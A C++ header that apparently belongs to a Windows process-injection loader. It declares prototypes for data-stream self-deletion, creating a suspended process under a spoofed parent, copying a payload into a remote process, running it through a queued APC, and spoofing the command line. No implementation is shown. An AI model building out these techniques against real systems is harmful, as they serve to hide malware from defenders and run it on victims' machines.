#pragma once
#include <Windows.h>
#include <cstdint>
#include <iostream>
#include <tuple>
#include <Psapi.h>
#include "Structures.hpp"
#include "resource.h"
#include "defs.hpp"


/* Prototypes */

bool DataStreamExploitDeleteFile(const wchar_t* FilePath);
std::tuple<HANDLE, HANDLE, std::uint32_t> CreateSuspendedProcess(const wchar_t* FilePath, _In_opt_ HANDLE Parent);
byte* RetrieveImageBase(HANDLE hProcess);
bool CopyPayloadIntoProcess(HANDLE hProcess, void* RemoteAddress, void* PayloadPtr, size_t PayloadSize);
bool QueueUserApcRunPayload(HANDLE hThread, void* RemoteAddress);
bool SpoofCommandLine(const wchar_t* NewCommandLine, HANDLE hProcess);
